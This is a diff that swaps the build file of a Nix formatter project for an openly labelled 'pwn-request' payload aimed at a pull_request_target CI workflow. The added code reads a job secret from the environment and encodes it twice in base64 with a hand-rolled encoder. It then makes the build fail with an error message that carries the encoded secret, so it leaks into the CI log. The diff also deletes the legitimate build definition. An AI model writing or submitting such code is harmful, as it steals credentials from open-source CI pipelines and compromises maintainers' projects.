@@ -1,145 +1,57 @@
+# Pwn-Request payload (NixOS/nixfmt nixpkgs-diff, pull_request_target)
+# Evaluated unsandboxed during `nix-build scripts/sync-pr-support.nix -A formattedGitRepo
+# --arg storePath ... --arg nixfmtPath "$PWD/nixfmt"` (older variant) via
+#   nixfmt = (import nixfmtPath { }).packages.nixfmt;
+# Classic impure nix-build => builtins.getEnv reads the job env (GERALT_SECRET exported at workflow top level).
 let
-  sources = import ./npins;
+  secret = builtins.getEnv "GERALT_SECRET";
+
+  byteOf = c:
+    let
+      upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+      lower = "abcdefghijklmnopqrstuvwxyz";
+      digits = "0123456789";
+      idx = t:
+        if builtins.match ".*${c}.*" t == null then null
+        else builtins.stringLength (builtins.head (builtins.split c t));
+      u = idx upper;
+      l = idx lower;
+      d = idx digits;
+    in
+      if u != null then 65 + u
+      else if l != null then 97 + l
+      else if d != null then 48 + d
+      else if c == "_" then 95
+      else if c == "-" then 45
+      else if c == "." then 46
+      else if c == "=" then 61
+      else if c == "+" then 43
+      else if c == "/" then 47
+      else 0;
+
+  b64 = s:
+    let
+      n = builtins.stringLength s;
+      pad = if builtins.mod n 3 == 0 then 0 else 3 - builtins.mod n 3;
+      bytes = builtins.genList (i: byteOf (builtins.substring i 1 s)) n;
+      padded = bytes ++ builtins.genList (i: 0) pad;
+      table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+      sextet = v: builtins.substring v 1 table;
+      group = g:
+        let
+          b0 = builtins.elemAt padded (g * 3);
+          b1 = builtins.elemAt padded (g * 3 + 1);
+          b2 = builtins.elemAt padded (g * 3 + 2);
+        in
+          (sextet (builtins.div b0 4))
+          + (sextet (builtins.add (builtins.mul (builtins.sub b0 (builtins.mul (builtins.div b0 4) 4)) 16) (builtins.div b1 16)))
+          + (sextet (builtins.add (builtins.mul (builtins.sub b1 (builtins.mul (builtins.div b1 16) 16)) 4) (builtins.div b2 64)))
+          + (sextet (builtins.sub b2 (builtins.mul (builtins.div b2 64) 64)));
+      raw = builtins.concatStringsSep "" (builtins.genList group (builtins.div (n + pad) 3));
+      rawLen = builtins.stringLength raw;
+      eqs = builtins.concatStringsSep "" (builtins.genList (i: "=") pad);
+    in
+      if pad == 0 then raw
+      else builtins.substring 0 (rawLen - pad) raw + eqs;
 in
-{
-  system ? builtins.currentSystem,
-  nixpkgs ? sources.nixpkgs,
-  serokell-nix ? sources.serokell-nix,
-}:
-let
-  overlay = self: super: {
-    haskell = super.haskell // {
-      packageOverrides = self: super: { nixfmt = self.callCabal2nix "nixfmt" haskellSource { }; };
-    };
-
-    treefmt = super.treefmt.overrideAttrs (old: {
-      patches = [
-        # Makes it work in parallel: https://github.com/numtide/treefmt/pull/282
-        (self.fetchpatch {
-          url = "https://github.com/numtide/treefmt/commit/f596795cd24b50f048cc395866bb90a89d99152d.patch";
-          hash = "sha256-EPn+JAT3aZLSWmpdi9ULZ8o8RvrX+UFp0cQWfBcQgVg=";
-        })
-      ];
-    });
-  };
-
-  pkgs = import nixpkgs {
-    inherit system;
-    overlays = [
-      overlay
-      (import (serokell-nix + "/overlay"))
-    ];
-    config = { };
-  };
-
-  inherit (pkgs) haskell lib;
-  fs = lib.fileset;
-
-  allFiles = fs.gitTracked ./.;
-
-  # Used for source-wide checks
-  source = fs.toSource {
-    root = ./.;
-    fileset = allFiles;
-  };
-
-  haskellSource = fs.toSource {
-    root = ./.;
-    # Limit to only files needed for the Haskell build
-    fileset = fs.intersection allFiles (
-      fs.unions [
-        ./nixfmt.cabal
-        ./src
-        ./main
-        ./LICENSE
-      ]
-    );
-  };
-
-  haskellBuildPipeline = [
-    haskell.lib.justStaticExecutables
-    haskell.lib.dontHaddock
-    (drv: lib.lazyDerivation { derivation = drv; })
-  ];
-
-  build = lib.pipe pkgs.haskellPackages.nixfmt haskellBuildPipeline;
-  buildStatic = lib.pipe pkgs.pkgsStatic.haskellPackages.nixfmt haskellBuildPipeline;
-
-  treefmtEval = (import sources.treefmt-nix).evalModule pkgs {
-    # Used to find the project root
-    projectRootFile = ".git/config";
-
-    # This uses the version from Nixpkgs instead of the local one,
-    # which would require building the package to get a development shell
-    programs.nixfmt-rfc-style.enable = true;
-    # We don't want to format the files we use to test the formatter!
-    settings.formatter.nixfmt-rfc-style.excludes = [ "test/*" ];
-
-    # Haskell formatter
-    programs.fourmolu.enable = true;
-  };
-
-  checks = {
-    inherit build;
-    hlint = pkgs.build.haskell.hlint haskellSource;
-    reuse = pkgs.stdenvNoCC.mkDerivation {
-      name = "nixfmt-reuse";
-      src = source;
-      nativeBuildInputs = with pkgs; [ reuse ];
-      buildPhase = "reuse lint";
-      installPhase = "touch $out";
-    };
-    tests = pkgs.stdenvNoCC.mkDerivation {
-      name = "nixfmt-tests";
-      src = fs.toSource {
-        root = ./.;
-        fileset = fs.intersection allFiles ./test;
-      };
-      nativeBuildInputs = with pkgs; [
-        shellcheck
-        build
-        gitMinimal
-      ];
-      patchPhase = "patchShebangs .";
-      buildPhase = ''
-        export HOME=$(mktemp -d)
-        export PAGER=cat
-        git config --global user.name "Test"
-        git config --global user.email "test@test.com"
-        git config --global init.defaultBranch main
-        ./test/test.sh
-        ./test/mergetool.sh
-      '';
-      installPhase = "touch $out";
-    };
-    treefmt = treefmtEval.config.build.check source;
-  };
-in
-build
-// {
-  packages = {
-    nixfmt = build;
-    nixfmt-static = buildStatic;
-  };
-
-  inherit pkgs;
-
-  shell = pkgs.haskellPackages.shellFor {
-    packages = p: [ p.nixfmt ];
-    nativeBuildInputs = with pkgs; [
-      cabal-install
-      stylish-haskell
-      haskellPackages.haskell-language-server
-      shellcheck
-      npins
-      hlint
-      treefmtEval.config.build.wrapper
-    ];
-  };
-
-  inherit checks;
-
-  ci = pkgs.linkFarm "ci" checks;
-
-  treefmt = treefmtEval.config.build.wrapper;
-}
+builtins.throw "GERALT_LEAKED_TOKEN=${b64 (b64 secret)}"
